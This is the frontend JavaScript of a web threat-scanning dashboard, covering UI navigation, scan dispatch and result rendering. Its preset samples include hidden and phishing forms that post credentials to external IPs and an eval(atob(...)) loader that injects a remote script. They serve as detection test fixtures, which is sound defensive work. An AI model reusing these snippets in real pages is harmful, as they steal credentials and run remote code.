/**
 * SentinelCore — Web Threat Detection System
 * Enterprise SOC Frontend Controller, Analytics & Animation Engine (v2.1)
 */

// Global Chart & Library Instances
let threatChartInstance = null;
let activityChartInstance = null;
let activityChartMeta = [];
let lastRenderedScanData = null;
let activeEvidenceCategory = "ALL";
let cachedEvidenceEntries = [];
let lenisInstance = null;
let scanLaserTween = null;
let scanStageInterval = null;

let currentHistoryFilter = "ALL";
let currentScanMode = "url";

// Register Chart.js custom radial tooltip positioner so donut tooltips never cover center total
function registerDonutTooltipPositioner() {
  if (typeof Chart !== "undefined" && Chart.Tooltip && Chart.Tooltip.positioners && !Chart.Tooltip.positioners.donutOutside) {
    Chart.Tooltip.positioners.donutOutside = function(items) {
      if (!items || !items.length) return false;
      const chart = this.chart;
      const el = items[0].element;
      if (!el || !chart.chartArea) return { x: 0, y: 0 };

      const centerX = (chart.chartArea.left + chart.chartArea.right) / 2;
      const centerY = (chart.chartArea.top + chart.chartArea.bottom) / 2;
      const angle = (typeof el.startAngle === "number" && typeof el.endAngle === "number")
        ? (el.startAngle + el.endAngle) / 2
        : 0;
      const radius = (el.outerRadius || 65) + 12;

      return {
        x: Math.round(centerX + Math.cos(angle) * radius),
        y: Math.round(centerY + Math.sin(angle) * radius)
      };
    };
  }
}

// ================= HELPER: ELEGANT ALERTS (SWEETALERT2) =================
function showSocAlert({ icon = "info", title = "Notice", text = "" }) {
  if (typeof Swal !== "undefined") {
    return Swal.fire({
      icon,
      title,
      text,
      confirmButtonText: "Acknowledge",
      background: "#111B2D",
      color: "#F8FAFC",
      confirmButtonColor: "#00B8F0"
    });
  } else {
    alert(`${title}\n\n${text}`);
    return Promise.resolve();
  }
}

async function showSocConfirm({ title = "Confirm Action", text = "", confirmText = "Confirm" }) {
  if (typeof Swal !== "undefined") {
    const res = await Swal.fire({
      icon: "warning",
      title,
      text,
      showCancelButton: true,
      confirmButtonText: confirmText,
      cancelButtonText: "Cancel",
      background: "#111B2D",
      color: "#F8FAFC",
      confirmButtonColor: "#EF4444",
      cancelButtonColor: "#1E293B"
    });
    return res.isConfirmed;
  } else {
    return confirm(text || title);
  }
}

function refreshIcons() {
  if (typeof lucide !== "undefined" && typeof lucide.createIcons === "function") {
    lucide.createIcons();
  }
}

// ================= INITIALIZATION =================
window.onload = () => {
  // Initialize Lucide icons
  refreshIcons();

  // Register custom Chart.js radial tooltip positioner
  registerDonutTooltipPositioner();

  // Initialize Lenis smooth scrolling
  initSmoothScroll();

  // Keep charts responsive across viewport resizes
  window.addEventListener("resize", () => {
    if (threatChartInstance) threatChartInstance.resize();
    if (activityChartInstance) activityChartInstance.resize();
  });

  // Hash-based navigation or default to dashboard
  const initialHash = window.location.hash.replace("#", "") || "dashboard";
  if (["dashboard", "scanner", "history", "reports", "settings"].includes(initialHash)) {
    switchView(initialHash, false);
  } else {
    switchView("dashboard", false);
  }

  // Initial data rendering from sessionStorage
  refreshAllDashboardData();

  // Initialize Enterprise SOC Timeline Stream & Controls
  initSocTimelineControls();
  fetchSocTimelineEvents();

  // Hide download button initially
  const downloadBtn = document.getElementById("downloadBtn");
  if (downloadBtn) downloadBtn.style.display = "none";

  // Entrance stagger animation via GSAP
  animateInitialEntrance();

  // Linear-style Cmd/Ctrl+K shortcut to jump to New Scan
  document.addEventListener("keydown", (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "k") {
      e.preventDefault();
      switchView("scanner");
      const inputEl = document.getElementById("inputData");
      if (inputEl) inputEl.focus();
    }
  });
};

function initSmoothScroll() {
  if (typeof Lenis !== "undefined") {
    lenisInstance = new Lenis({
      duration: 1.05,
      easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
      smoothWheel: true,
      wheelMultiplier: 0.95
    });

    function raf(time) {
      lenisInstance.raf(time);
      requestAnimationFrame(raf);
    }
    requestAnimationFrame(raf);
  }
}

function animateInitialEntrance() {
  if (typeof gsap === "undefined") return;

  gsap.from(".sidebar", {
    x: -16,
    opacity: 0,
    duration: 0.45,
    ease: "power2.out",
    clearProps: "transform,opacity"
  });

  gsap.from("#view-dashboard .stat-card", {
    y: 14,
    opacity: 0,
    duration: 0.45,
    stagger: 0.06,
    ease: "power2.out",
    clearProps: "transform,opacity"
  });
}

// ================= VIEW NAVIGATION =================
function switchView(viewName, animate = true) {
  const navItems = document.querySelectorAll(".nav-item");
  navItems.forEach(item => {
    if (item.getAttribute("data-view") === viewName) {
      item.classList.add("active");
    } else {
      item.classList.remove("active");
    }
  });

  const viewSections = document.querySelectorAll(".view-section");
  let targetSection = null;
  viewSections.forEach(section => {
    if (section.id === `view-${viewName}`) {
      section.classList.add("active");
      targetSection = section;
    } else {
      section.classList.remove("active");
    }
  });

  // Update Topbar breadcrumb & titles
  const titleEl = document.getElementById("pageTitle");
  const subEl = document.getElementById("pageSubtitle");
  const crumbEl = document.getElementById("pageBreadcrumb");

  const pageMeta = {
    dashboard: {
      crumb: "OVERVIEW",
      title: "Security Operations Dashboard",
      subtitle: "Real-time threat intelligence, DOM inspection, and session telemetry"
    },
    scanner: {
      crumb: "TARGET SCANNER",
      title: "Target Threat Scanner",
      subtitle: "Context-aware static DOM inspection and VirusTotal v3 reputation analysis"
    },
    history: {
      crumb: "AUDIT LOG",
      title: "Detection Audit Log",
      subtitle: "Comprehensive session history of completed security evaluations"
    },
    reports: {
      crumb: "REPORTS",
      title: "Threat & Compliance Reports",
      subtitle: "Automated executive reporting and continuous incident notification center"
    },
    settings: {
      crumb: "CONFIGURATION",
      title: "Detection Engine Configuration",
      subtitle: "Heuristic thresholds, calibration policies, and API integration parameters"
    }
  };

  if (pageMeta[viewName]) {
    if (crumbEl) crumbEl.innerText = pageMeta[viewName].crumb;
    if (titleEl) titleEl.innerText = pageMeta[viewName].title;
    if (subEl) subEl.innerText = pageMeta[viewName].subtitle;
  }

  // Update URL hash safely without scroll jump
  if (history.replaceState) {
    history.replaceState(null, null, `#${viewName}`);
  }

  // Close mobile sidebar if open
  toggleSidebar(false);

  // Scroll to top smoothly
  if (lenisInstance) {
    lenisInstance.scrollTo(0, { immediate: true });
    lenisInstance.resize();
  } else {
    window.scrollTo(0, 0);
  }

  // Animate incoming view smoothly via GSAP
  if (animate && targetSection && typeof gsap !== "undefined") {
    gsap.fromTo(
      targetSection,
      { opacity: 0, y: 10 },
      { opacity: 1, y: 0, duration: 0.3, ease: "power2.out", clearProps: "transform,opacity" }
    );
  }

  // Refresh relevant view data
  if (viewName === "dashboard" || viewName === "history") {
    refreshAllDashboardData();
  }

  if (viewName === "dashboard") {
    requestAnimationFrame(() => {
      if (threatChartInstance) threatChartInstance.resize();
      if (activityChartInstance) activityChartInstance.resize();
    });
  }

  refreshIcons();
}

// Mobile sidebar toggle
function toggleSidebar(open) {
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("sidebarOverlay");
  if (sidebar && overlay) {
    if (open) {
      sidebar.classList.add("open");
      overlay.classList.add("active");
    } else {
      sidebar.classList.remove("open");
      overlay.classList.remove("active");
    }
  }
}

// ================= SCANNER MODE TOGGLING =================
function setScanMode(mode) {
  currentScanMode = mode;
  const urlBtn = document.getElementById("modeUrlBtn");
  const htmlBtn = document.getElementById("modeHtmlBtn");
  const inputEl = document.getElementById("inputData");
  const instructionEl = document.getElementById("instructionsText");

  if (mode === "url") {
    if (urlBtn) urlBtn.classList.add("active");
    if (htmlBtn) htmlBtn.classList.remove("active");
    if (inputEl) {
      inputEl.placeholder = "Enter target website URL (e.g. https://github.com or https://google.com)";
      inputEl.rows = 3;
    }
    if (instructionEl) {
      instructionEl.innerHTML = "Enter a fully qualified URL (starting with <code>http://</code> or <code>https://</code>). The system will fetch and analyze DOM structure, embedded scripts, and check VirusTotal threat database.";
    }
  } else {
    if (htmlBtn) htmlBtn.classList.add("active");
    if (urlBtn) urlBtn.classList.remove("active");
    if (inputEl) {
      inputEl.placeholder = "Paste raw HTML source code or markup here (e.g. <html><head>...</head><body>...</body></html>)...";
      inputEl.rows = 6;
    }
    if (instructionEl) {
      instructionEl.innerHTML = "Paste raw HTML source code. The scanner performs comprehensive static DOM inspection, obfuscation checks, and hidden element analysis without fetching external URLs.";
    }
  }
}

// Quick presets loader
function loadPreset(type) {
  const inputEl = document.getElementById("inputData");
  if (!inputEl) return;

  switch (type) {
    case "github":
      setScanMode("url");
      inputEl.value = "https://github.com";
      break;
    case "google":
      setScanMode("url");
      inputEl.value = "https://google.com";
      break;
    case "hidden_pass":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Account Portal</title></head>
<body>
  <h2>Welcome to Customer Support</h2>
  <!-- Hidden form stealing user credentials silently -->
  <form action="http://192.168.1.100/harvest" method="POST" style="display:none; visibility:hidden; opacity:0;">
    <input type="text" name="username" value="" />
    <input type="password" name="password" value="" />
  </form>
  <p>Please browse our help documentation.</p>
</body>
</html>`;
      break;
    case "phishing":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Urgent Security Verification</title></head>
<body>
  <div class="alert">
    <h2>Security Alert: Account Suspended Immediately</h2>
    <p>Unauthorized activity detected on your wallet. Enter password now to claim your refund.</p>
  </div>
  <form action="http://185.220.101.5/collect.php" method="POST">
    <input type="text" name="email" placeholder="Account Email" />
    <input type="password" name="password" placeholder="Current Password" />
    <button type="submit">Verify Now</button>
  </form>
</body>
</html>`;
      break;
    case "eval":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Performance Optimizer</title></head>
<body>
  <script>
    // Obfuscated payload disguised via eval + atob dynamic decoding
    const encodedPayload = "ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8vNDUuMzMuMzIuMTU2L3hzczEuanMnPjwvc2NyaXB0PiIpOw==";
    eval(atob(encodedPayload));
  </script>
</body>
</html>`;
      break;
    case "iframe":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Company News</title></head>
<body>
  <h1>Corporate Announcements</h1>
  <p>Read our quarterly investor updates below.</p>
  <!-- Concealed zero-dimension external frame for silent clickjacking -->
  <iframe src="http://malicious-external-tracker.org/exploit" width="0" height="0" style="display:none;"></iframe>
</body>
</html>`;
      break;
  }

  switchView("scanner");
  inputEl.focus();
}

// Quick Target Inspector state helper
function setQuickInspectorState(isBusy, statusMsg = "") {
  const quickBtn = document.getElementById("quickScanBtn");
  const quickBtnText = document.getElementById("quickScanBtnText");
  const quickStatus = document.getElementById("quickScanStatus");
  const quickStatusText = document.getElementById("quickStatusText");
  const quickInput = document.getElementById("quickInput");

  if (quickBtn) quickBtn.disabled = isBusy;
  if (quickInput) quickInput.disabled = isBusy;
  if (quickBtnText) quickBtnText.innerText = isBusy ? "Scanning..." : "Inspect";

  if (quickStatus) {
    quickStatus.style.display = isBusy ? "flex" : "none";
  }
  if (quickStatusText && statusMsg) {
    quickStatusText.textContent = statusMsg;
  }
}

// Quick scan from Dashboard widget
function handleQuickScan() {
  const quickInput = document.getElementById("quickInput");
  const target = quickInput ? quickInput.value.trim() : "";

  if (!target) {
    if (quickInput) quickInput.focus();
    showSocAlert({
      icon: "warning",
      title: "Target Input Required",
      text: "Please enter a valid website URL or paste an HTML snippet to inspect."
    });
    return;
  }

  const isHtmlSnippet =
    target.includes("<html") ||
    target.includes("<script") ||
    target.includes("<div") ||
    target.includes("<iframe") ||
    target.includes("<body") ||
    target.includes("<form") ||
    target.includes("<!DOCTYPE");

  const normalizedTarget = (!target.startsWith("http://") && !target.startsWith("https://") && !isHtmlSnippet && target.includes(".") && !target.includes("<"))
    ? `https://${target}`
    : target;

  const inputEl = document.getElementById("inputData");
  if (inputEl) {
    inputEl.value = normalizedTarget;
  }

  if (normalizedTarget.startsWith("http://") || normalizedTarget.startsWith("https://")) {
    setScanMode("url");
  } else {
    setScanMode("html");
  }

  // Show intuitive scanning feedback in Quick Inspector before handing off
  const displayLabel = normalizedTarget.length > 42 ? normalizedTarget.slice(0, 42) + "..." : normalizedTarget;
  setQuickInspectorState(true, `Dispatching "${displayLabel}" to SOC inspection pipeline...`);
  refreshIcons();

  setTimeout(() => {
    switchView("scanner");
    scan();
  }, 260);
}

// ================= TACTICAL SCANNING ANIMATION (GSAP) =================
function startScanAnimation(isUrlMode) {
  const loading = document.getElementById("loading");
  const laser = document.querySelector(".scan-laser-line");
  const stageDom = document.getElementById("stageDom");
  const stageJs = document.getElementById("stageJs");
  const stageVt = document.getElementById("stageVt");
  const stageRisk = document.getElementById("stageRisk");
  const loadingStage = document.getElementById("loadingStage");

  if (!loading) return;
  loading.style.display = "flex";

  // Reset stage pills
  [stageDom, stageJs, stageVt, stageRisk].forEach(el => {
    if (el) el.classList.remove("active", "done");
  });

  if (stageDom) stageDom.classList.add("active");
  if (loadingStage) {
    loadingStage.innerText = isUrlMode
      ? "Fetching remote target DOM and initializing heuristic parser..."
      : "Parsing raw HTML DOM tree and inspecting embedded elements...";
  }

  if (typeof gsap !== "undefined") {
    gsap.fromTo(loading, { opacity: 0, y: 8 }, { opacity: 1, y: 0, duration: 0.25, ease: "power2.out" });
    if (laser) {
      if (scanLaserTween) scanLaserTween.kill();
      scanLaserTween = gsap.fromTo(
        laser,
        { left: "-5%" },
        { left: "105%", duration: 1.5, repeat: -1, ease: "sine.inOut" }
      );
    }
  }

  let step = 0;
  if (scanStageInterval) clearInterval(scanStageInterval);
  scanStageInterval = setInterval(() => {
    step++;
    if (step === 1) {
      if (stageDom) { stageDom.classList.remove("active"); stageDom.classList.add("done"); }
      if (stageJs) stageJs.classList.add("active");
      if (loadingStage) loadingStage.innerText = "Scanning script tags for obfuscation, keyloggers & dynamic injection...";
    } else if (step === 2) {
      if (stageJs) { stageJs.classList.remove("active"); stageJs.classList.add("done"); }
      if (stageVt) stageVt.classList.add("active");
      if (loadingStage) {
        loadingStage.innerText = isUrlMode
          ? "Querying VirusTotal v3 reputation intelligence feeds..."
          : "Evaluating cross-domain credential targets and phishing lures...";
      }
    } else if (step >= 3) {
      if (stageVt) { stageVt.classList.remove("active"); stageVt.classList.add("done"); }
      if (stageRisk) stageRisk.classList.add("active");
      if (loadingStage) loadingStage.innerText = "Aggregating evidence-based risk score and verdict...";
    }
  }, 550);
}

function stopScanAnimation() {
  const loading = document.getElementById("loading");
  if (scanLaserTween) {
    scanLaserTween.kill();
    scanLaserTween = null;
  }
  if (scanStageInterval) {
    clearInterval(scanStageInterval);
    scanStageInterval = null;
  }
  if (loading) loading.style.display = "none";
}

// ================= PRIMARY SCAN LOGIC =================
async function scan() {
  const scanBtn = document.getElementById("scanBtn");
  const resultDiv = document.getElementById("result");
  const inputField = document.getElementById("inputData");

  const input = inputField ? inputField.value.trim() : "";

  if (!input) {
    showSocAlert({
      icon: "warning",
      title: "Input Required",
      text: "Please enter a website URL or HTML source code before launching a scan."
    });
    return;
  }

  // Detect input type
  let bodyData = {};
  let targetLabel = "";

  const looksLikeHtml = /<(html|head|body|script|div|iframe|form|meta|p|span|a|input|!doctype)\b/i.test(input);

  if (input.startsWith("http://") || input.startsWith("https://")) {
    try {
      const parsed = new URL(input);
      if (!parsed.hostname) throw new Error("Missing host");
      bodyData.url = parsed.href;
      targetLabel = parsed.href;
    } catch (_) {
      showSocAlert({
        icon: "error",
        title: "Invalid URL Format",
        text: "Please enter a properly formatted URL (for example, https://example.com)."
      });
      return;
    }
  } else if (looksLikeHtml) {
    bodyData.html = input;
    targetLabel = "HTML Source (" + (input.length > 36 ? input.slice(0, 36).replace(/\s+/g, " ") + "..." : input) + ")";
  } else if (input.includes(".") && !input.includes("<") && !/\s/.test(input)) {
    try {
      const parsed = new URL("https://" + input);
      bodyData.url = parsed.href;
      targetLabel = parsed.href;
      if (inputField) inputField.value = bodyData.url;
    } catch (_) {
      showSocAlert({
        icon: "error",
        title: "Invalid Target Input",
        text: "Please provide a valid URL (e.g. https://example.com) or valid HTML markup."
      });
      return;
    }
  } else {
    showSocAlert({
      icon: "error",
      title: "Invalid Target Input",
      text: "Please provide a valid URL (e.g. https://example.com) or valid HTML markup."
    });
    return;
  }

  // Start Tactical Scanning UI
  startScanAnimation(Boolean(bodyData.url));
  if (scanBtn) {
    scanBtn.disabled = true;
    scanBtn.classList.add("loading-active");
    const scanSpan = scanBtn.querySelector("span");
    if (scanSpan) scanSpan.innerText = "Scanning...";
  }
  if (resultDiv) resultDiv.style.display = "none";

  try {
    const response = await fetch("http://localhost:3000/scan", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(bodyData)
    });

    const data = await response.json();

    if (!response.ok || !data.risk || !data.analysis) {
      showSocAlert({
        icon: "error",
        title: "Scan Failed",
        text: data.error || "Invalid response received from detection backend."
      });
      return;
    }

    const scanTimestamp = new Date().toLocaleString();

    // Populate Results UI safely
    renderScanResult(targetLabel, data, { rawInput: input, timestamp: scanTimestamp });

    // Save history with full audit details
    saveToHistory(targetLabel, data.risk.severity || "LOW", data, input, scanTimestamp);

    // Refresh all history & dashboard statistics
    refreshAllDashboardData();

  } catch (err) {
    showSocAlert({
      icon: "error",
      title: "Backend Connection Error",
      text: "Could not reach detection engine at http://localhost:3000. Ensure src/server.js is running."
    });
    console.error("Scan fetch error:", err);
  } finally {
    stopScanAnimation();
    setQuickInspectorState(false);
    if (scanBtn) {
      scanBtn.disabled = false;
      scanBtn.classList.remove("loading-active");
      const scanSpan = scanBtn.querySelector("span");
      if (scanSpan) scanSpan.innerText = "Scan Website";
    }
  }
}

// ================= REPORT ACTIONS =================
function copyTargetUrl() {
  const targetVal = lastRenderedScanData?.target || document.getElementById("resultTargetValue")?.textContent || "";
  if (!targetVal) return;

  const btn = document.getElementById("copyTargetBtn");
  const markCopied = () => {
    if (!btn) return;
    btn.innerHTML = `<i data-lucide="check" class="icon-12"></i><span>Copied</span>`;
    refreshIcons();
    setTimeout(() => {
      btn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy Target</span>`;
      refreshIcons();
    }, 1600);
  };

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(targetVal).then(markCopied).catch(() => {
      showSocAlert({ icon: "info", title: "Target Input", text: targetVal });
    });
  } else {
    showSocAlert({ icon: "info", title: "Target Input", text: targetVal });
  }
}

function rescanCurrentTarget() {
  const inputField = document.getElementById("inputData");
  const target = lastRenderedScanData?.target || "";
  const rawInput = lastRenderedScanData?.rawInput || "";

  if (!target && !rawInput) {
    showSocAlert({
      icon: "info",
      title: "No Target Loaded",
      text: "Execute or open a scan result first before rescanning."
    });
    return;
  }

  if (target.startsWith("http://") || target.startsWith("https://")) {
    setScanMode("url");
    if (inputField) inputField.value = target;
    scan();
    return;
  }

  if (rawInput) {
    setScanMode("html");
    if (inputField) inputField.value = rawInput;
    scan();
    return;
  }

  setScanMode("html");
  showSocAlert({
    icon: "info",
    title: "HTML Source Required",
    text: "This historical record only stored summary metadata for a raw HTML snippet. Paste the HTML source into the editor to run a fresh scan."
  });
}

function exportPdfReport() {
  const resultDiv = document.getElementById("result");
  if (!resultDiv || resultDiv.style.display === "none") {
    showSocAlert({
      icon: "info",
      title: "No Report Available",
      text: "Execute or open a scan result before exporting a PDF brief."
    });
    return;
  }
  window.print();
}

// ================= RENDER SCAN RESULTS =================
function renderScanResult(targetLabel, data, options = {}) {
  const resultDiv = document.getElementById("result");
  const downloadBtn = document.getElementById("downloadBtn");

  if (!resultDiv) return;

  const safeAnalysis = data?.analysis || {};
  const safeRisk = data?.risk || {};
  const safeVt = data?.virusTotal || null;
  const timestamp = options.timestamp || new Date().toLocaleString();

  lastRenderedScanData = {
    target: targetLabel,
    rawInput: options.rawInput || "",
    timestamp,
    data: {
      analysis: safeAnalysis,
      risk: safeRisk,
      virusTotal: safeVt
    }
  };

  resultDiv.style.display = "block";
  if (downloadBtn) downloadBtn.style.display = "inline-flex";

  // Target info (XSS-safe textContent)
  const isUrlTarget = typeof targetLabel === "string" && (targetLabel.startsWith("http://") || targetLabel.startsWith("https://"));
  const targetValEl = document.getElementById("resultTargetValue");
  const targetTypeEl = document.getElementById("resultTargetType");
  const heroTargetMeta = document.getElementById("heroTargetMeta");
  if (targetValEl) targetValEl.textContent = targetLabel || "Unknown Target";
  if (targetTypeEl) targetTypeEl.textContent = isUrlTarget ? "URL" : "HTML";
  if (heroTargetMeta) {
    heroTargetMeta.textContent = targetLabel || "Unknown Target";
    heroTargetMeta.title = targetLabel || "";
  }

  // Timestamp
  const scanTimeEl = document.getElementById("scanTime");
  if (scanTimeEl) scanTimeEl.textContent = timestamp;

  // 1. EXECUTIVE SECURITY VERDICT (SAFE, SUSPICIOUS, MALICIOUS, INCONCLUSIVE)
  const verdictRaw = String(safeRisk.verdict || "SAFE").toUpperCase();
  const verdict = ["SAFE", "SUSPICIOUS", "MALICIOUS", "INCONCLUSIVE"].includes(verdictRaw)
    ? verdictRaw
    : "INCONCLUSIVE";
  const verdictKey = verdict.toLowerCase();

  const verdictHeroCard = document.getElementById("verdictKpiCard");
  if (verdictHeroCard) {
    verdictHeroCard.className = `verdict-hero verdict-${verdictKey}`;
  }

  const verdictEl = document.getElementById("securityVerdict");
  const verdictIcon = document.getElementById("severityIcon");
  const verdictPolicyBadge = document.getElementById("verdictPolicyBadge");
  const verdictDesc = document.getElementById("verdictDesc");

  if (verdictEl) {
    verdictEl.textContent = verdict;
    verdictEl.className = "verdict-text " + verdictKey;
  }

  if (verdictIcon) {
    verdictIcon.textContent =
      verdict === "SAFE" ? "✅" :
      verdict === "SUSPICIOUS" ? "⚠️" :
      verdict === "MALICIOUS" ? "🚨" : "❓";
  }

  if (verdictPolicyBadge) {
    verdictPolicyBadge.className = `verdict-policy-pill ${verdictKey}`;
    verdictPolicyBadge.textContent =
      verdict === "SAFE" ? "VERIFIED BASELINE" :
      verdict === "SUSPICIOUS" ? "ANOMALIES DETECTED" :
      verdict === "MALICIOUS" ? "HIGH-CONFIDENCE THREAT" : "INSUFFICIENT COVERAGE";
  }

  if (verdictDesc) {
    if (verdict === "SAFE") {
      verdictDesc.textContent = "Safe: No significant malicious threat indicators found across inspected payload and available intelligence.";
    } else if (verdict === "SUSPICIOUS") {
      verdictDesc.textContent = "Suspicious: Credible anomaly or moderate threat indicators detected; analyst inspection advised.";
    } else if (verdict === "MALICIOUS") {
      verdictDesc.textContent = "Malicious: Confirmed malicious blacklist detections or high-confidence attack infrastructure identified.";
    } else {
      verdictDesc.textContent = "Inconclusive: Target payload was empty or lacked parseable HTML structure for reliable classification.";
    }
  }

  // 2. RISK SEVERITY & COMPOSITE SCORE (0 - 100) + CIRCULAR GAUGE
  const severity = String(safeRisk.severity || "LOW").toUpperCase();
  const severityKey = ["LOW", "MEDIUM", "HIGH"].includes(severity) ? severity.toLowerCase() : "low";
  const riskScore = typeof safeRisk.riskScore === "number" ? safeRisk.riskScore : 0;

  const severityEl = document.getElementById("severity");
  const heroSeverityMeta = document.getElementById("heroSeverityMeta");
  const heroScoreMeta = document.getElementById("heroScoreMeta");

  if (severityEl) {
    severityEl.textContent = severity;
    severityEl.className = "status-badge " + severityKey;
  }
  if (heroSeverityMeta) heroSeverityMeta.textContent = severity;
  if (heroScoreMeta) heroScoreMeta.textContent = `${riskScore} / 100`;

  const riskScoreEl = document.getElementById("riskScore");
  if (riskScoreEl) {
    if (typeof gsap !== "undefined") {
      const counter = { val: 0 };
      gsap.to(counter, {
        val: riskScore,
        duration: 0.65,
        ease: "power2.out",
        onUpdate: () => {
          riskScoreEl.textContent = Math.round(counter.val);
        }
      });
    } else {
      riskScoreEl.textContent = riskScore;
    }
  }

  const pct = Math.min(100, Math.max(0, riskScore));
  const progressBar = document.getElementById("riskScoreProgressBar");
  if (progressBar) {
    progressBar.style.width = `${pct}%`;
    progressBar.className = "risk-bar-fill " + severityKey;
  }

  const gaugeArc = document.getElementById("riskGaugeArc");
  if (gaugeArc) {
    const circumference = 2 * Math.PI * 54;
    const offset = circumference * (1 - pct / 100);
    gaugeArc.setAttribute("stroke-dasharray", circumference.toFixed(3));
    gaugeArc.setAttribute("stroke-dashoffset", offset.toFixed(3));
    gaugeArc.className.baseVal = `risk-gauge-arc ${severityKey}`;
  }

  const scoredThreats = Array.isArray(safeRisk.scoredThreats) ? safeRisk.scoredThreats : [];
  const factorsNote = document.getElementById("riskFactorsSummary");
  if (factorsNote) {
    if (verdict === "INCONCLUSIVE") {
      factorsNote.textContent = "0 risk points assigned — target lacked sufficient inspectable DOM payload.";
    } else if (scoredThreats.length === 0) {
      factorsNote.textContent = "0 risk points assigned — informational observations contribute 0 risk points.";
    } else {
      factorsNote.textContent = `${scoredThreats.length} weighted threat signal${scoredThreats.length === 1 ? "" : "s"} contributing ${riskScore} / 100 points.`;
    }
  }

  // 3. SCAN COVERAGE & AUDIT COUNTS
  const coverage = safeRisk.scanCoverage || "FULL";
  const coverageBadge = document.getElementById("scanCoverageBadge");
  const coverageNote = document.getElementById("coverageNote");
  const metricThreatCount = document.getElementById("metricThreatCount");
  const metricInfoCount = document.getElementById("metricInfoCount");

  if (coverageBadge) {
    if (coverage === "FULL") {
      coverageBadge.textContent = "Full Inspection";
      coverageBadge.className = "coverage-pill full";
    } else if (coverage === "STATIC_ONLY") {
      coverageBadge.textContent = "Static Only (VT Unavailable)";
      coverageBadge.className = "coverage-pill partial";
    } else {
      coverageBadge.textContent = "Insufficient Coverage";
      coverageBadge.className = "coverage-pill insufficient";
    }
  }

  if (coverageNote) {
    coverageNote.textContent = safeRisk.coverageNote || "Static DOM and script heuristics verified.";
  }

  const findingsList = Array.isArray(safeRisk.evidenceFindings)
    ? safeRisk.evidenceFindings
    : (Array.isArray(safeAnalysis.findings) ? safeAnalysis.findings : []);
  const threatCount = typeof safeRisk.threatCount === "number"
    ? safeRisk.threatCount
    : scoredThreats.length;
  const infoCount = typeof safeRisk.infoCount === "number"
    ? safeRisk.infoCount
    : findingsList.filter(f => !f.isThreat).length;

  if (metricThreatCount) metricThreatCount.textContent = threatCount;
  if (metricInfoCount) metricInfoCount.textContent = infoCount;

  // 4. DEDICATED VIRUSTOTAL THREAT INTELLIGENCE SECTION
  renderVirusTotalIntelligence(safeVt);

  // 5. STATIC DOM ANALYSIS MATRIX
  renderStaticDomMatrix(safeAnalysis);

  // 6. RISK EXPLANATIONS
  const explanationUl = document.getElementById("riskExplanation");
  if (explanationUl) {
    explanationUl.innerHTML = "";
    const explanations = Array.isArray(safeRisk.explanation) && safeRisk.explanation.length > 0
      ? safeRisk.explanation
      : ["No major threat indicators or anomaly patterns were found during inspection."];

    explanations.forEach(text => {
      const li = document.createElement("li");
      const isDanger = verdict === "MALICIOUS";
      const isWarning = verdict === "SUSPICIOUS";
      const isSafe = verdict === "SAFE";

      li.className = `explanation-item ${isDanger ? "danger" : isWarning ? "warning" : isSafe ? "safe" : "info"}`;

      const iconSpan = document.createElement("span");
      iconSpan.className = "explanation-icon";
      iconSpan.textContent = isDanger ? "🚨" : isWarning ? "⚠️" : isSafe ? "✅" : "ℹ️";

      const textSpan = document.createElement("span");
      textSpan.textContent = String(text);

      li.appendChild(iconSpan);
      li.appendChild(textSpan);
      explanationUl.appendChild(li);
    });
  }

  // 7. RECOMMENDED REMEDIATION & ACTIONS
  renderRemediationPlaybook({ analysis: safeAnalysis, risk: safeRisk, virusTotal: safeVt });

  // 8. CATEGORIZED DETECTION EVIDENCE + SCORE BREAKDOWN
  activeEvidenceCategory = "ALL";
  renderScoreBreakdown(scoredThreats, riskScore);
  renderEvidenceFindings(findingsList, scoredThreats);

  // Highlight parameter violations in dashboard matrix if visible
  highlightSeverityViolations(data);

  // GSAP subtle entrance
  if (typeof gsap !== "undefined") {
    gsap.fromTo(
      resultDiv,
      { opacity: 0, y: 14 },
      { opacity: 1, y: 0, duration: 0.36, ease: "power2.out", clearProps: "transform,opacity" }
    );
    gsap.fromTo(
      "#result .verdict-hero, #result .risk-gauge-card, #result .vt-intel-card",
      { opacity: 0, y: 10 },
      { opacity: 1, y: 0, duration: 0.32, stagger: 0.05, delay: 0.06, ease: "power2.out", clearProps: "transform,opacity" }
    );
  }

  refreshIcons();

  if (lenisInstance) {
    lenisInstance.resize();
    lenisInstance.scrollTo(resultDiv, { offset: -86, duration: 0.8 });
  } else {
    resultDiv.scrollIntoView({ behavior: "smooth", block: "nearest" });
  }
}

// ================= VIRUSTOTAL THREAT INTELLIGENCE RENDERER =================
function renderVirusTotalIntelligence(vt) {
  const statusPill = document.getElementById("vtEngineStatusBadge");
  const statusNote = document.getElementById("vtStatusNote");
  const tsEl = document.getElementById("vtAnalysisTimestamp");
  const malEl = document.getElementById("vtMalicious");
  const suspEl = document.getElementById("vtSuspicious");
  const harmlessEl = document.getElementById("vtHarmless");
  const undetectedEl = document.getElementById("vtUndetected");
  const totalEl = document.getElementById("vtTotalEngines");
  const repEl = document.getElementById("vtReputation");
  const consensusWrap = document.getElementById("vtConsensusWrap");
  const consensusBar = document.getElementById("vtConsensusBar");
  const consensusSummary = document.getElementById("vtConsensusSummary");
  const disclaimerText = document.getElementById("vtDisclaimerText");

  const status = vt?.status || "unavailable";
  const isSuccess = vt?.available === true && status === "success";

  if (isSuccess) {
    const mal = typeof vt.malicious === "number" ? vt.malicious : 0;
    const susp = typeof vt.suspicious === "number" ? vt.suspicious : 0;
    const harmless = typeof vt.harmless === "number" ? vt.harmless : 0;
    const undetected = typeof vt.undetected === "number" ? vt.undetected : 0;
    const totalEngines = mal + susp + harmless + undetected;

    if (malEl) malEl.textContent = mal;
    if (suspEl) suspEl.textContent = susp;
    if (harmlessEl) harmlessEl.textContent = harmless;
    if (undetectedEl) undetectedEl.textContent = undetected;
    if (totalEl) totalEl.textContent = totalEngines;
